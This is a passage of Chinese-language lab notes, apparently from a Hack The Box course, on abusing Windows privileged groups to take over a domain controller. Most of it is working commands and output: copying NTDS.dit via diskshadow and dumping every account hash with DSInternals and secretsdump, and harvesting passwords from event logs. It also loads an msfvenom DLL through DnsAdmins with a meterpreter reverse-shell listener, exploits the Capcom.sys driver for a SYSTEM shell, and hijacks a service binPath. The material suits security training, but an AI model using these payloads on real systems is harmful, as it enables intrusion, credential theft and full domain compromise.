&lt;...SNIP...&gt;</code></pre>
<p><strong>攻击DC - Copying NTDS.dit</strong> 该组还允许本地登录域控制器。活动目录数据库 <code>NTDS.dit</code> 是一个非常有吸引力的目标，因为它包含了该域内所有用户和计算机对象的 NTLM 哈希值。然而，该文件被锁定，且非特权用户无法访问。</p>
<p>由于 <code>NTDS.dit</code> 文件默认被锁定，我们可以使用 Windows 的 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow" rel="noreferrer" target="_blank">diskshadow</a> 工具创建 <code>C</code> 盘的影子副本，并将其暴露为 <code>E</code> 盘。这个影子副本中的 NTDS.dit 不会被系统使用。</p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW&gt; set verbose on
DISKSHADOW&gt; set metadata C:\Windows\Temp\meta.cab
DISKSHADOW&gt; set context clientaccessible
DISKSHADOW&gt; set context persistent
DISKSHADOW&gt; begin backup
DISKSHADOW&gt; add volume C: alias cdrive
DISKSHADOW&gt; create
DISKSHADOW&gt; expose %cdrive% E:
DISKSHADOW&gt; end backup
DISKSHADOW&gt; exit

PS C:\htb&gt; dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows</code></pre>
<p>接下来，我们可以使用 <code>Copy-FileSeBackupPrivilege</code> cmdlet 绕过 ACL，将 NTDS.dit 复制到本地。</p>
<ol><li>Copying NTDS.dit Locally</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

Copied 16777216 bytes</code></pre>
<p>&gt;SYSTEM Registry Hives: 在 Windows 里，<strong>Registry（注册表）</strong> 是一个分层数据库，用来存系统配置。</p>
<ol><li>备份SAM和SYSTEM Registry Hives</li></ol>
<p>该权限还允许我们备份 SAM 和 SYSTEM Registry Hives，使用 Impacket's <code>secretsdump.py</code> 等工具离线提取本地账户凭证</p>
<pre><code class="language-cmd-session">C:\htb&gt; reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\htb&gt; reg save HKLM\SAM SAM.SAV

The operation completed successfully.</code></pre>
<p>值得注意的是，如果某个文件夹或文件对当前用户或他们所属的组有明确的拒绝访问，即使指定了 <code>FILE_FLAG_BACKUP_SEMANTICS</code> 标志，也会阻止我们访问该文件。</p>
<p>提取完 NTDS.dit 后，我们可以使用 <code>secretsdump.py</code> 或 PowerShell <code>DSInternals</code> 模块等工具提取所有 Active Directory 账户凭证。我们用 <code>DSInternals</code> 获取该域名<code>管理员</code>账户的 NTLM 哈希值。</p>
<ol><li>从 NTDS.dit 中提取凭据</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Import-Module .\DSInternals.psd1
PS C:\htb&gt; $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb&gt; Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
Sid: S-1-5-21-669053619-2741956077-1013132368-500
Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215
SamAccountName: Administrator
SamAccountType: User
UserPrincipalName:
PrimaryGroupId: 513
SidHistory:
Enabled: True
UserAccountControl: NormalAccount, PasswordNeverExpires
AdminCount: True
Deleted: False
LastLogonDate: 5/6/2021 5:40:30 PM
DisplayName:
GivenName:
Surname:
Description: Built-in account for administering the computer/domain
ServicePrincipalName:
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
DiscretionaryAclProtected, SelfRelative
Owner: S-1-5-21-669053619-2741956077-1013132368-512
Secrets
  NTHash: cf3a5525ee9414229e66279623ed5c58
  LMHash:
  NTHashHistory:
  LMHashHistory:
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: d60dfbbf20548938
      OldCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 94c300d0e47775b407f2496a5cca1a0a
          Iterations: 4096
        DES_CBC_MD5
          Key: d60dfbbf20548938
          Iterations: 4096
      OldCredentials:
      OlderCredentials:
      ServiceCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
Key Credentials:
Credential Roaming
  Created:
  Modified:
  Credentials:</code></pre>
<p>我们也可以离线使用 <code>SecretsDump</code> 从之前获得的 <code>ntds.dit</code> 文件中提取哈希值。这些数据随后可用于哈希传递以访问额外资源，或通过 <code>Hashcat</code> 离线破解以获得更多访问权限。如果被破解，我们还能为客户提供密码破解统计数据，详细了解其域名内的密码强度和使用情况，并建议改进密码策略（增加最短密码长度，创建禁止词典等）。</p>
<ol><li>使用 SecretsDump 提取哈希值</li></ol>
<pre><code class="language-shell-session">henduoduo@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::

&lt;SNIP&gt;</code></pre>
<p><strong>Robocopy</strong> 用 Robocopy 复制文件 内置的工具 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy" rel="noreferrer" target="_blank">robocopy</a> 也可以用来备份文件。Robocopy 是一种命令行目录复制工具。它可以用于创建备份作业，并包含多线程复制、自动重试、恢复复制等功能。Robocopy 与<code>复制</code>命令的不同之处在于，它不仅能复制所有文件，还能检查目标目录并删除不再在源目录中的文件。它还能在复制前比较文件，节省时间，避免复制自上次复制/备份工作后未更改的文件。</p>
<pre><code class="language-cmd-session">C:\htb&gt; robocopy /B E:\Windows\NTDS .\ntds ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, May 6, 2021 1:11:47 PM
   Source : E:\Windows\NTDS\
     Dest : C:\Tools\ntds\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          1    E:\Windows\NTDS\
100%        New File              16.0 m        ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           356962042 Bytes/sec.
   Speed :           20425.531 MegaBytes/min.
   Ended : Thursday, May 6, 2021 1:11:47 PM</code></pre>
<h3>Event Log Readers 事件日志读取者</h3>
<p>假设启用了对进程创建事件及相应命令行值的审计 。此时，该信息会作为事件 ID 4688 保存到 Windows 安全事件日志中：新进程已创建 。组织可以支持进程命令行的日志记录，帮助防御者监控和识别可能的恶意行为，识别系统中不应存在的二进制文件。这些数据可以被传输到 SIEM 工具，或导入搜索工具（如 ElasticSearch），以便防御者了解网络系统中运行的二进制文件。这些工具随后会标记任何潜在的恶意活动，比如市场营销主管工作站运行的 <code>whoami</code>、<code>netstat</code> 和<code>任务列表</code>命令。</p>
<p>在 Windows 安全日志中： <strong>4688 = 新进程已创建（A new process has been created）</strong></p>
<p>也就是：</p>
<blockquote>当一个程序被启动时，系统会写一条日志。</blockquote>
<p>例如：</p>
<p>都会产生 4688。</p>
<ul><li>打开 cmd.exe</li><li>运行 PowerShell</li><li>执行 whoami</li><li>启动某个 exe</li></ul>
<p>本研究展示了攻击者在初次访问后最常执行的一些命令（任务<code>列表</code> 、<code>ver</code>、<code>ipconfig</code>、<code>systeminfo</code> 等）、侦察（<code>dir</code>、<code>net view</code>、<code>ping</code>、 <code>网络使用</code> 、 <code>类型</code>等）以及在网络内传播恶意软件（<code>at</code>、<code>reg</code>、<code>wmic</code>、<code>wusa</code>，等等）。除了监控这些命令的运行外，组织还可以更进一步，利用经过精细调整的 AppLocker 规则限制特定命令的执行。对于安全预算紧张的组织来说，利用 Microsoft 内置工具可以为主机层面的网络活动提供极佳的可视化。大多数现代企业 EDR 工具都能进行检测/阻断，但由于预算和人员限制，许多组织难以实现。这个小例子表明，安全改进，如网络和主机层的可见性，可以用最少的努力、成本和巨大的影响完成。</p>
<p>几年前，我对一家中型组织进行了渗透测试，当时安全团队很小，没有企业 EDR，但使用的配置与上述类似（审计流程创建和命令行值）。他们抓住并控制了我的一名团队成员，当时他们用财务部门工作站的一名成员执行<code>tasklist</code>命令（在用 <code>Responder</code> 捕获凭证并离线破解后）。</p>
<p>管理员或事件日志阅读?redirectedfrom=MSDN#event-log-readers)组成员有权访问此日志。系统管理员可能会想将高级用户或开发者加入该组，以执行某些任务而无需授予管理员权限。</p>
<p><strong>确认group成员</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup "Event Log Readers"

Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members

-------------------------------------------------------------------------------
logger
The command completed successfully.</code></pre>
<p>发布了涵盖所有内置 Windows 命令的参考指南 ，包括语法、参数和示例。许多 Windows 命令支持以密码作为参数传递，如果启用了对进程命令行的审计，这些敏感信息将被捕获。</p>
<p>我们可以用 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil" rel="noreferrer" target="_blank">wevtutil</a> 工具和 <a href="https://docs.microsoft.com/en-us/PowerShell/module/microsoft.PowerShell.diagnostics/get-winevent?view=PowerShell-7.1" rel="noreferrer" target="_blank">Get-WinEvent</a> PowerShell 命令符从命令行查询 Windows 事件。</p>
<p><strong>使用 wevtutil 搜索安全日志</strong></p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword</code></pre>
<p>我们也可以用<code>参数 /u</code> 和 <code>/p</code> 为 <code>wevtutil</code> 指定备用凭证。</p>
<p><strong>Passing Credentials to wevtutil</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"</code></pre>
<p>对于 <code>Get-WinEvent</code>，语法如下。在此示例中，我们过滤进程创建事件（4688），其中进程命令行包含 <code>/user</code>。</p>
<blockquote>注意：使用 <code>Get-WInEvent</code> 搜索<code>安全</code>事件日志需要管理员权限或对注册表密钥 <code>HKLM\System\CurrentControlSet\Services\Eventlog\Security</code> 进行权限调整。仅仅是<code>事件日志阅读</code>组成员身份是不够的。</blockquote>
<p><strong>使用 Get-WinEvent 搜索安全日志</strong></p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword</code></pre>
<p>该 cmdlet 也可以作为另一个用户使用 <code>-Credential</code> 参数运行。 其他日志包括 PowerShell 作日志，如果启用脚本块或模块日志，可能还包含敏感信息或凭证。该日志对无权限用户开放。</p>
<h3>DnsAdmins DNS 管理员</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins" rel="noreferrer" target="_blank">DnsAdmins</a> 组的成员可以访问网络上的 DNS 信息。Windows DNS 服务支持自定义插件，并能调用插件中的函数来解决不在任何本地托管 DNS 区域范围内的名称查询。DNS 服务以 <code>NT AUTHORITY\SYSTEM</code> 形式运行，因此该组成员身份可能被用来提升域控制器的权限，或在有独立服务器作为该域的 DNS 服务器时升级。可以使用内置的 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd" rel="noreferrer" target="_blank">dnscmd</a> 工具来指定插件 DLL 的路径。正如这篇优秀文章中详细说明的，当域名控制器上运行 DNS 时（非常常见）可以实施以下攻击：</p>
<p>管理通过 RPC 进行</p>
<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723" rel="noreferrer" target="_blank">ServerLevelPluginDll</a> 允许我们加载自定义 DLL，且无需对 DLL 路径进行任何验证。这可以通过命令行中的 <code>dnscmd</code> 工具完成</p>
<p>当 <code>DnsAdmins</code> 组的成员执行下面的 <code>dnscmd</code> 命令时，注册 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code> 表密钥会被填充</p>
<p>当 DNS 服务重启时，该路径中的 DLL 会被加载（即域控制器机器账户可以访问的网络共享）</p>
<p>攻击者可以加载自定义 DLL 以获取反向 shell，甚至加载如 Mimikatz 等工具作为 DLL 来倾倒凭证。</p>
<ul><li>DNS management is performed over RPC</li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723" rel="noreferrer" target="_blank">ServerLevelPluginDll</a> allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the <code>dnscmd</code> tool from the command line</li><li>When a member of the <code>DnsAdmins</code> group runs the <code>dnscmd</code> command below, the <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code> registry key is populated</li><li>When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)</li><li>An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.</li></ul>
<p><strong>利用 DnsAdmins 访问权限, Leveraging DnsAdmins Access</strong></p>
<p>我们可以生成一个恶意 DLL，使用 <code>msfvenom</code> 将用户添加到<code>domain admins</code>群中。</p>
<ol><li>生成恶意 DLL</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 5120 bytes
Saved as: adduser.dll</code></pre>
<p>接下来，启动一个 Python HTTP 服务器。</p>
<ol><li>启动本地HTTP服务器</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ python3 -m http.server 7777

Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
10.129.43.9 - - [19/May/2021 19:22:46] "GET /adduser.dll HTTP/1.1" 200 -</code></pre>
<p>把文件下载给目标。</p>
<ol><li>向目标下载文件</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt;  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"</code></pre>
<p>我们用 msfconsole 打开一个监听器，使用这个方法：</p>
<pre><code>msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST IP; set LPORT 4242; run"</code></pre>
<ol><li>加载 dll 文件：</li></ol>
<pre><code>dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\reverseshell.dll</code></pre>
<p>Press enter or click to view image in full size</p>
<img alt="Referenced image" src="https://miro.medium.com/v2/resize:fit:1050/1*SlaFH6tJgHJ8x4WtofXHwQ.png"/>
<ol><li>在 cmd 中停止和开始 DNS：</li></ol>
<pre><code class="language-cmd">sc stop dns
sc start dns</code></pre>
<img alt="Referenced image" src="https://miro.medium.com/v2/resize:fit:971/1*xZ847WY3IpPi1az0fgofwA.png"/>
<p>然后我们得到一个反向壳同时：</p>
<p>Press enter or click to view image in full size</p>
<img alt="Referenced image" src="https://miro.medium.com/v2/resize:fit:1050/1*oWFADwnorLf_xkRH5N1OVw.png"/>
<p>now you can get the flag on:</p>
<pre><code class="language-cmd">c:\Users\Administrator\Desktop\DnsAdmins\flag.txt</code></pre>
<h3>Print Operators 打印操作员</h3>
<p>打印操作员组是另一个权限极高的组，它赋予其成员<code>SeLoadDriverPrivilege</code>管理、创建、共享和删除连接到域控制器的打印机的权限，以及本地登录域控制器并将其关闭的权限。如果我们发出命令<code>whoami /priv</code>，并且在非提升权限的上下文中看不到该组<code>SeLoadDriverPrivilege</code>，则需要绕过用户账户控制 (UAC)。</p>
<ol><li>确认权限</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name           Description                          State
======================== =================================    =======
SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
SeShutdownPrivilege      Shut down the system                 Disabled</code></pre>
<p>UACMe代码库提供了一个全面的 UAC 绕过方法列表，可从命令行使用。或者，我们也可以从图形用户界面 (GUI) 打开一个管理员命令 shell，并输入属于“打印操作员”组的帐户凭据。如果我们再次检查权限，<code>SeLoadDriverPrivilege</code>会发现该权限可见但已被禁用。</p>
<ol><li>再次确认权限</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================  ==========
SeMachineAccountPrivilege     Add workstations to domain           Disabled
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system			       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled</code></pre>
<p>众所周知，该驱动程序<code>Capcom.sys</code>包含允许任何用户以 SYSTEM 权限执行 shellcode 的功能。我们可以利用这些权限加载此易受攻击的驱动程序并提升权限。我们可以使用此工具加载驱动程序。该 PoC 不仅能够启用权限，还能为我们加载驱动程序。</p>
<p>下载到本地并进行编辑，将下面的包含内容粘贴到相应位置。</p>
<pre><code class="language-c">#include &lt;windows.h&gt;
#include &lt;assert.h&gt;
#include &lt;winternl.h&gt;
#include &lt;sddl.h&gt;
#include &lt;stdio.h&gt;
#include "tchar.h"</code></pre>
<p>接下来，从 Visual Studio 2019 开发人员命令提示符中，使用<strong>cl.exe</strong>进行编译。</p>
<p><strong>使用cl.exe编译</strong></p>
<pre><code class="language-cmd-session">C:\Users\mrb3n\Desktop\Print Operators&gt;cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

EnableSeLoadDriverPrivilege.cpp
Microsoft (R) Incremental Linker Version 14.28.29913.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.obj</code></pre>
<p><strong>添加驱动程序引用</strong> <code>Capcom.sys</code>接下来，从这里下载驱动程序，并将其保存到指定位置<code>C:\temp</code>。执行以下命令，在 HKEY_CURRENT_USER 树下添加对该驱动程序的引用。</p>
<pre><code class="language-cmd-session">C:\htb&gt; reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

The operation completed successfully.


C:\htb&gt; reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The operation completed successfully.</code></pre>
<p><code>\??\</code>用于引用恶意驱动程序映像路径的特殊语法是一种NT 对象路径。Win32 API 将解析并解析此路径，以便正确定位并加载我们的恶意驱动程序。</p>
<p><strong>确认驱动程序未加载</strong> 使用 Nirsoft 的<a href="http://www.nirsoft.net/utils/driverview.html" rel="noreferrer" target="_blank">DriverView.exe</a>，我们可以验证 Capcom.sys 驱动程序未加载。</p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; .\DriverView.exe /stext drivers.txt
PS C:\htb&gt; cat drivers.txt | Select-String -pattern Capcom</code></pre>
<p><strong>验证权限是否已启用</strong> 运行该<code>EnableSeLoadDriverPrivilege.exe</code>二进制文件。</p>
<pre><code class="language-cmd-session">C:\htb&gt; EnableSeLoadDriverPrivilege.exe

whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
NTSTATUS: 00000000, WinError: 0</code></pre>
<p><strong>确认Capcom驱动程序已列出</strong></p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; .\DriverView.exe /stext drivers.txt
PS C:\htb&gt; cat drivers.txt | Select-String -pattern Capcom

Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys</code></pre>
<p><strong>使用ExploitCapcom工具提升权限</strong> 要利用 Capcom.sys，我们可以先用 Visual Studio 编译，然后使用ExploitCapcom工具。</p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; .\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched</code></pre>
<p>这将启动一个具有 SYSTEM 权限的 shell。</p>
<img alt="Pasted image 20260228081647" src="assets/posts/windows-privilege-escalation/Pasted image 20260228081647.png"/>
<p><strong>替换方法 - 无图形用户界面</strong> 如果我们无法通过图形用户界面访问目标系统，则必须<code>ExploitCapcom.cpp</code>在编译前修改代码。在这里，我们可以编辑第 292 行，并将其替换为例如<code>"C:\\Windows\\system32\\cmd.exe"</code>使用 <code>reverse shell binary</code> 创建的反向 shell 二进制文件。<code>msfvenom</code><code>c:\ProgramData\revshell.exe</code></p>
<pre><code class="language-c">// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &amp;StartupInfo,
        &amp;ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}</code></pre>
<p>本例中的字符串<code>CommandLine</code>将更改为：</p>
<pre><code class="language-c"> TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");</code></pre>
<p><code>msfvenom</code>我们会根据生成的有效载荷设置一个监听器，希望在执行命令时能够收到反向 shell 连接<code>ExploitCapcom.exe</code>。如果反向 shell 连接由于某种原因被阻止，我们可以尝试绑定 shell 或执行/添加用户有效载荷。</p>
<p><strong>自动化步骤</strong> 使用EopLoadDriver实现自动化 我们可以使用EoPLoadDriver之类的工具来自动执行启用权限、创建注册表项以及加载驱动程序的过程<code>NTLoadDriver</code>。为此，我们可以运行以下命令：</p>
<pre><code class="language-cmd-session">C:\htb&gt; EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0</code></pre>
<p>然后我们会运行命令<code>ExploitCapcom.exe</code>来弹出 SYSTEM shell 或运行我们自定义的二进制文件。</p>
<p><strong>清理</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; reg delete HKCU\System\CurrentControlSet\Capcom

Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes

The operation completed successfully.</code></pre>
<h3>Server Operators 服务器操作员</h3>
<p>服务器运营者组允许成员无需分配域管理员权限即可管理 Windows 服务器。这是一个非常高权限的组，可以本地登录服务器，包括域控制器。 加入该组可获得强大的 <code>SeBackupPrivilege</code> 和 <code>SeRestorePrivilege</code> 权限，并能控制本地服务。</p>
<p>让我们来看看 <code>AppReadiness</code> 服务。我们可以确认，该服务是通过 <code>sc.exe</code> 工具作为 SYSTEM 启动的。</p>
<ol><li>查询 AppReadiness 服务</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem</code></pre>
<p>我们可以使用服务查看器/控制器 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice" rel="noreferrer" target="_blank">PsService</a>，它是系统内部套件的一部分，来检查服务权限。<code>PsService</code> 的工作原理类似于 <code>sc</code> 工具，可以显示服务状态和配置，还允许你在本地和远程主机上启动、停止、暂停、恢复和重启服务。</p>
<ol><li>使用 PsService 检查服务权限</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All</code></pre>
<p>这证实了服务器运营商组拥有 <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights" rel="noreferrer" target="_blank">SERVICE_ALL_ACCESS</a> 访问权限，从而让我们对该服务拥有完全的控制权。</p>
<p>让我们看看本地管理员组当前的成员，确认我们的目标账户是否存在。</p>
<ol><li>检查本地管理员组成员</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.</code></pre>
<p>我们改二进制路径，执行一个命令，将当前用户添加到默认的本地管理员组。</p>
<ol><li>修改服务二进制路径</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS</code></pre>
<p>启动服务失败，这是意料之中的。</p>
<ol><li>服务启动</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.</code></pre>
<blockquote>必须触发一次“启动”，命令才会被执行。原因很简单：你改 <code>binPath</code> 只是改了配置，相当于把“下次启动时要运行的程序”改掉了。  <strong>但服务只有在启动那一刻才会读取 <code>binPath</code> 并创建进程。</strong></blockquote>
<p>如果我们检查管理员组的成员身份，会发现命令已成功执行。</p>
<ol><li>确认本地管理员组成员资格</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.</code></pre>
<p>从这里，我们可以完全控制域控制器，可以从 NTDS 数据库中检索所有凭证，访问其他系统，并执行后期的利用任务。</p>
<ol><li>确认域控制器的本地管理员访问权限</li></ol>
